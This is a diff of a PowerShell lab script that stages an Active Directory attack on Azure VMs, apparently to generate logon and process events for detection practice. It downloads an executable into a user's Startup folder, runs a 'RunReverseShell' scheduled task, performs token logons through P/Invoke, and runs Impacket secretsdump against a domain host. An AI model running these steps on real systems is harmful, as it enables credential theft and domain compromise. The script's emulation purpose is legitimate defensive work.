@@ -991,47 +1213,15 @@ if (`$config -match "SeServiceLogonRight\s*=\s*(.*`$accountSID.*)") {
 
 # Clean up temporary files
 Remove-Item `$SecEditFile -Force
+
 "@
+# Connect with NTLMv1
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 
 
-    Invoke-AzVMRunCommand -ResourceGroupName $rgName -VMName $vmName -CommandId "RunPowerShellScript" -ScriptString $mservscript
-}
-
-# Start parallel jobs
-#$jobs = @(
-#    Start-Job -Name "Web01Setup" -ScriptBlock $Web01ScriptBlock -ArgumentList $resourceGroupName, $adminPassword, $web01Name,
-#    Start-Job -Name "MservSetup" -ScriptBlock $MservScriptBlock -ArgumentList $resourceGroupName, $adminPassword, $mservName
-#)
-
-$Web01ScriptBlock.Invoke($resourceGroupName,$adminPassword,$web01Name)
-$MservScriptBlock.Invoke($resourceGroupName,$adminPassword,$mservName)
-
-# Monitor job completion
-#Get-Job | Wait-Job
-
-# Retrieve outputs and handle errors
-#Get-Job | ForEach-Object {
-#    if ($_.State -eq 'Failed') {
-#        Write-Error "Job $_ failed: $($_.Error)"
-#    } else {
-#        Receive-Job -Job $_ | Write-Output
-#    }
-#}
-
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 5 tasks completed successfully!"
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
 
 
-#######################################
-# Step 5 ends here
-#######################################
-
-
-########################################################################
-# Step 6.
-# - Logging on candice, downloading rs.exe, running rs.exe
-# - Loggin on ssupport
-#########################################################################
-
-Write-Output "Initiating Step 6..."
 
 # Simulate user logon and initial access
 $CandiceUserName = "ODOMAIN\candice.kevin"
@@ -1090,20 +1280,6 @@ Set-Content -Path `$downloadScriptPath -Value `$downloadScript -Force -Encoding 
 `$destination = Join-Path `$startupFolder `$ExeName
 Invoke-WebRequest -Uri `$DownloadUrl -OutFile `$destination
 
-
-Write-Output "[+] Emulating RS running under candice..."
-schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
-
-`$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
-`$PathDir = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-`$task = Get-ScheduledTask -TaskName "RunReverseShell"
-`$newAction = New-ScheduledTaskAction -Execute `$Path 
-Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password
-
-Start-ScheduledTask -TaskName "RunReverseShell"
-schtasks /run /tn "RunReverseShell"
-
-Write-Output "`n[+] There should be 4688 events for rs.exe."
 
 
 # -----------------------
@@ -1215,13 +1391,115 @@ schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPoli
 schtasks /run /tn "RunDownload"
 
 Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."
+"@
+
+
+$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script
+$output.Value | ForEach-Object { $_.Message }
 
 
 
-# logging on as support
+# Simulate Support PersonnelLogon
+$SupportUserName = "ODOMAIN\ssupport"
+
+$w10script2=@"
+`$UserName    = "$SupportUserName"
+`$Password    = "$adminPassword"
+
+
+Write-Output "[+] Emulating RS running under candice..."
+schtasks /create /tn "RunReverseShell" /tr "'C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe'" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
+
+`$Path = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rs.exe"
+`$PathDir = "C:\Users\candice.kevin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+`$task = Get-ScheduledTask -TaskName "RunReverseShell"
+`$newAction = New-ScheduledTaskAction -Execute `$Path 
+Set-ScheduledTask -TaskName "RunReverseShell" -Action `$newAction -Trigger `$task.Triggers -User 'ODOMAIN\candice.kevin' -Password `$Password
+
+Start-ScheduledTask -TaskName "RunReverseShell"
+schtasks /run /tn "RunReverseShell"
+
+Write-Output "`n[+] There should be 4688 events for rs.exe."
+
+
+# -----------------------
+# STEP 1: Add P/Invoke definitions
+# -----------------------
+Add-Type -TypeDefinition `@"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class NativeMethods {
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern bool LogonUser(
+        string lpszUsername,
+        string lpszDomain,
+        string lpszPassword,
+        int dwLogonType,
+        int dwLogonProvider,
+        out IntPtr phToken);
+
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern bool CreateProcessAsUser(
+        IntPtr hToken,
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        int dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    // Logon types
+    public const int LOGON32_LOGON_INTERACTIVE = 2;
+    public const int LOGON32_PROVIDER_DEFAULT  = 0;
+}
+"`@
+
+# -----------------------
+# STEP 1: LogonUser (Interactive) for ssupport
+# -----------------------
+Write-Host "`n[+] Attempting interactive logon for user: `$UserName"
 
 `$domain = ""
-`$user   = "ODOMAIN\ssupport"
+`$user   = `$UserName
 if (`$UserName -like "*\*") {
     `$domain = `$UserName.Split("\")[0]
     `$user   = `$UserName.Split("\")[1]
@@ -1242,32 +1520,25 @@ if (!`$logonOk) {
     throw "LogonUser (interactive) failed. Win32 error: `$err"
 }
 
-Write-Output "[+] LogonUser succeeded. We have an interactive token for ssupport."
-Write-Output "`n[+] There should be Event Log for a Type 2 logon for ssupport."
+Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."
+Write-Output "`n[+] There should be Event Log for a Type 2 logon for `$UserName."
 "@
 
 
-$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script
+$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script2
 $output.Value | ForEach-Object { $_.Message }
 
 
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 6 tasks completed successfully!"
 
-#######################################
-# Step 6 ends here
-#######################################
+# Final stage of the attack
+# LDAP Simple Bind, Kerberosting, Lateral Movement to mserv, AD compromise
 
-
-########################################################################
-# Step 7.
-# - Secretsdump from mserv using web01
-#########################################################################
-Write-Output "Initiating Step 7..."
-
+# Bash command to create and run the Python script
 $Command = @"
 #!/bin/bash
 sudo /root/.local/bin/secretsdump.py 'ODOMAIN/ssupport:$adminPassword'@10.0.0.5
 "@
+
 
 # Execute the command on the Linux VM
 Write-Output "Executing script on the Linux VM web01..."
@@ -1287,4 +1558,3 @@ try {
     Write-Error "Failed to execute command: $_"
 }
 
-Write-Output "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Step 7 tasks completed successfully!"
